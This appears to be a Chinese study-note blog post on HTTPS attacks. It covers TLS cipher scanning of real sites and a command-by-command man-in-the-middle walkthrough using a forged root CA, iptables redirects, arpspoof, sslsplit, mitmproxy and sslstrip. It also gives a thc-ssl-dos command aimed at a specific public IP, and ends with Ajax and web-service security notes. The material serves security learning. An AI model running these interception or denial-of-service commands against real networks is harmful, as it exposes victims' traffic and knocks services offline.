# HTTPS攻击






# HTTPS攻击

防止恶意注入、DNS劫持


#### https的作用
- C I A 
- 解决的是信息`传输过程中`数据被篡改、窃取
- 加密：对称、非对称、单向(Hash)


#### https攻击方法
- 降级攻击

- 解密攻击（明文、证书伪造）-- 劫持

- 协议漏洞、实现方法的漏洞、配置不严格

   

##### 常识

`SSL`（安全套接层, Secure socket layer）,后来使用`TSL`取代了SSL，只不过习惯了叫SSL



**SSL/TLS也被用于其他场景的传输通道加密：**

- 邮件传输（服务器间、客户端与服务器间）
- 数据库服务器间
- LDAP身份认证服务器间
- SSL VPN
- 远程桌面RDP通信过程中的加密和身份认证



**Web通信中SSL加密**

- 公钥证书（受信任的第三方证书颁发机构签名颁发）
- 常见的证书颁发机构：VeriSign、Thawte、GlobalSign、Symantec



**加密过程：**握手、协商加密算法、获取公钥证书、交换会话秘钥、加密信息传输



**非对称加密算法**

非对称加密一般用来加密比较小的数据
例如：RSA, ECC等

**对称加密算法**

DES/3DES, AES, IDEA, RC4 ......

**单向加密算法(Hash)**

| Hash算法 | Hash值长度(bit) |
| -------- | --------------- |
| MD5      | 128             |
| SHA-1    | 160             |
| SHA-2    | 224,256,384,512 |

**SSL的弱点**

- SSL是不同的对称、非对称、单项加密算法的组合加密实现(`cipher suite`)
- 服务器端为提供更好的兼容性，选择支持大量过时cipher suite
- 协商过程中墙皮降级加密强度
- 现代处理器计算能力可以在可接受的时间内破解过时加密算法
- 购买云计算资源破解



##### 实践

> 查看web站点用了啥样的ssl协议，什么版本，什么组合  

###### 1.`openssl`命令

```bash
openssl s_client --connect www.baidu.com:443

#证书颁发机构也是树形结构的，有一级二级

#指定查看是否支持某协议和组合
openssl s_client -tls1_2 -cipher 'ECDHE-ECDSA-AES128-GCM-SHA256' -connect www.taobao.com:443

# 测试是否可以跟已知的不安全的cipher suite建立连接
openssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect www.taobao.com:443

# 已知的不安全的组合cipher suite
openssl ciphers -v 'NULL,EXPORT,LOW,DES'

# 参考网站（加密技术）
https://www.openssl.org/docs/apps/ciphers.html
```
![](http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_1.png)

Openssl需要大量密码学相关知识，命令复杂，结果可读性差



###### 2.`SSLScan`工具

- 自动识别ssl配置错误、过期协议、过时cipher suite和hash算法
- 默认会检查CRIME、心脏出血漏洞
- 绿色表示安全，红色黄色需要引起注意



查看TLS支持的cipher suite

```bash
# 检查所有的支持的tls是否有不安全的
sslscan --tlsall www.taobao.com:443

# Altnames选项下面的域名也可以使用上面域名的证书
```
分析证书详细信息
```bash
sslscan --show-certificate -no-ciphersuites www.taobao.com:443
```



###### 3.`SSLyze`工具

- Python编写
- 检查ssl过时版本
- 检查存在弱点的cipher suite
- 扫描多站点时，支持来源文件(多个站点放到一个文件里面)
- 检查是否支持会话恢复

```bash
sslyze --regular  www.supercomputerboytony.cn

```



###### 4.`Nmap`

```bash
# 枚举cipher suite
nmap --script=ssl-enum-ciphers.nse www.supercomputerboytony.cn
```



###### 5. 在线网站：

输入域名，对SSL进行检测
https://www.ssllabs.com/ssltest

-----------------------------





# SSL中间人攻击

#### 概述

攻击者位于客户端和服务器通信链路中

- 1.ARP欺骗（最常用）
- 2.DHCP
如果有另一台机器，比之前的dhcp服务器离用户更近，那么攻击者的机器就会更快响应(DHCP第一步是广播)
- 3.修改网关
- 4.修改DNS(如果控制了客户机, 直接修改客户机的dns配置)
- 5.修改HOSTS
- 6.ICMP、STP(二层的生成树协议)、OSPF(三层的开放式最短路径优先协议)  --->如果处在同一局域网

>不仅是http和tcp/ip协议容易出现安全问题，底层的网络协议也存在很多问题，自己搭建环境练习

加密流量

![](http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_2.png)



> ps：下来的演示，是基于ARP欺骗的：



#### 利用

##### 攻击的前提

- 客户端已经信任了伪造证书颁发机构
- 攻击者控制了核发证书颁发机构（CA证书服务器）
- 客户端程序禁止了显示证书错误告警信息
- 攻击者已经控制客户端，并强制其信任伪造证书

##### 工具
对已经实现中间人欺骗(这里用`arpspoof`)后，下面的工具对信息进行解密

###### 1.`SSLsplit`工具
- 透明SSL/TLS中间人攻击工具
- 对客户端伪装成服务器，对服务器伪装成普通客户端
- 伪装服务器需要伪造证书（利用`openssl`来生成伪造的证书）
- 支持ssl/tls加密的smtp、pop3、ftp等通信中间人攻击

**1). openssl**

```bash
# 1.利用openssl生成证书私钥
openssl genrsa -out ca.key 2048

# 2.利用私钥签名生成证书(生效时间,使用的私钥文件)  -- 这是根证书，不是一会使用的证书，用的证书是需要这个根证书来签名的
openssl req -new -x509 -days 1096 -key ca.key -out ca.crt

# 下来输入一些信息即可（信息可以把之前扫描的信息添进来以保证看起来很真实）
```

**2).攻击机器设置路由转发**
下面，当受害者的流量通过我的机器，我的机器来转发（需要我的系统来开启路由功能）：

做个地址转换, 比如:  把我计算机443端口收到的数据包转发到8443端口

```bash
# 先查看要用到的端口有没有被占用
netstst -pantu |grep :80

# 查看nat表
iptables -t nat -L

# -F  清空
iptables -t nat -F

# 端口转发命令（PREROUTING在路由之前,-p协议, -j操作）
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8443
iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIFECT --to-port 8443   # MSA
iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIFECT --to-port 8443    # SMTPS 发邮件
iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIFECT --to-port 8443	# IMAPS    收邮件
iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIFECT --to-port 8443 #POP3S
#其他使用ssl协议加密的协议端口一样

iptables -L

```

**3).ARP欺骗**
```bash
# -i本地网卡 -t要欺骗的目标， -r:让他认为网关192.168.1.1的mac地址是我本机的mac地址
arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1

#可以发现：受害者机器上关于网关的mac已经换成了kali的
```

**4).启动SSLsplit**
```bash
mkdir -p test/logdir

# -D:debug显示详细信息，-l把连接信息记录到哪，-j“越狱”的根目录(sslsplit的)，-S请求具体数据内容保存的目录，-k私钥，-c证书；对ssl加密的在本地8443监听,对明文在本地8080监听
sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

# 所有操作完成了
```
- 然后让被害者访问https的一些网站(会显示证书有问题,是否继续浏览)  
- 我们可以查看日志和浏览器证书以及证书保存信息(`cat connect.log`) ,
- 具体通信数据在:`ls test/logdir`, 每个log文件中内容会有被解密的明文信息（如果还有加密信息,那就是应用程序本身进行了加密的，这里的解密的只是通信过程中针对ssl部分）
  通过关键词查找内容：`grep xxx *.log`这样
- 在受害者机器上安装我们生成的服务器根证书之后再次访问(浏览器就不会弹出警告了)



>全站https/非全站https（比如只是登录等部分页面加了https）



###### 2.`Mitmproxy`工具

- 设置路由表转发规则

```bash
# bug: 只能在8080端口监听，所以需要修改规则
iptables -t nat -F

iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8080
```

- 也是使用`arpspoof`进行arp欺骗

```bash
arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1
```

- 最后，Mitmproxy侦听

```
mitmproxy -T --host -w mitmproxy.log

# mitmproxy会自动生成一个证书
```



###### 3.`SSLstrip`工具

与前两种工具不同，此工具将客户端到中间人之间的流量变为明文(不用通过安装证书)
```bash
# 这种更实用便捷，但是......
sslstrip -l 8080
```



----------



## SSL/TLS拒绝服务攻击

>和流量式的拒绝服务攻击不同(打击的是网络带宽)，而我们这里打击的是服务器的资源



#### Note:

- SSL协商加密，服务器资源加载速度会变慢（大量握手请求会导致拒绝服务），但是优化得当就可以没问题
- 利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载
- 与流量式的拒绝服务攻击不同，thc-ssl-dos可利用dsl线路打垮30G带宽的服务器
- 服务器平均可以处理300次/s SSL握手请求



#### 利用

##### `thc-ssl-dos`工具
```bash
#使用
thc-ssl-dos 199.223.209.205 2083 -accept
```


> `dig`命令，解析ip地址







----------



## 补充概念

#### Ajax

Asynchronous JavaScript and XML

是一组现有技术的组合

通过客户端脚本动态更新页面部分内容，而非整个页面   

降低带宽使用，提高速度

提升用户体验

后台异步访问



**Ajax组件**

- JavaScript(ajax的核心组件)
- Dynamic HTML(DHTML) 
- DOM

**ajax框架：**

- jQuery
- Dojo Tookit
- Google Web toolkit
- Microsoft Ajax library

**基于Ajax的Web应用工作流程**


![](http://image.xpshuai.cn/HTTPS%E6%94%BB%E5%87%BB_3.png)

> 使用的技术混合越多，攻击面就越大(每个参数都可能形成独立的攻击过程)



**Ajax的安全问题**

- 多种技术混合，攻击面就越大(每个参数都可能形成独立的攻击过程)
- Ajax引擎，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可能被绕过
- 服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露
- 暴露应用程序逻辑



**Ajax对渗透测试的挑战**

- 异步请求数量多且隐蔽

- 触发Ajax请求的条件无规律

- 手动和阶段大力爬网可能产生大量遗漏

  

**检查方法：**
- 手动查看页面源代码有没有使用ajax（效率低一些）
- 浏览器打开审查元素：net --> XHR  /   net --> javascript
- 使用ZAP，使用ajax爬站功能






#### Web Service
- 面向服务的架构，便于不同系统集成共享数据和功能
- 尤其适合不想暴露数据模型和程序逻辑而访问数据的场景
- 无页面

**两种类型：**

- SOAP （传统，xml是唯一的数据交换格式，繁琐，但是安全）  -- Simple object access protocol
- RESTful (json是首选的数据交换格式刷)



**web service安全考虑：**

- 使用API key或session token实现和跟踪身份认证
- 身份认证由服务器完成，而非客户端
- API key, 用户名, Session token 永远不要通过URL发送
- RESTful 不提供任何安全机制，需要使用SSL/TLS保护传输数据安全
- SOAP提供强于HTTPS的WS-security机制
- 使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的秘钥加密API key
- RESTful应只允许身份认证用户使用PUT、DELETE方法
- 使用所及token防止CSRF攻击
- 对用户提交参数过滤，建议部署基于严格白名单的方法
- 报错信息消毒
- 直接对象引用应严格身份验证(电商公司以ID作为主索引)




---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://geoer.cn/https%E6%94%BB%E5%87%BB/  

